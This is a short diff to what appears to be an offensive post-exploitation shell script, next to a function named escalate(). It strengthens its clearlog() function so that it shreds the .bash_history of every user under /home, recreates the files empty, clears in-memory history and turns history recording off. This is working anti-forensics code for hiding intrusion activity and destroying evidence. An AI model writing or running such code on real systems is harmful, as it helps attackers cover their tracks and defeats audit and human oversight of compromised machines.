@@ -354,7 +354,9 @@ escalate(){
 clearlog(){
 	export HISTFILE=
 	unset HISTFILE
-	rm -rf ~/.bash_history
+	shred -zu ~/.bash_history
+	find /home/ -name ".bash_history" -exec shred -zu {} \; -exec touch {} \;
+	history -c
 	touch ~/.bash_history
 	unset HISTFILE HISTSIZE
 	set history=0
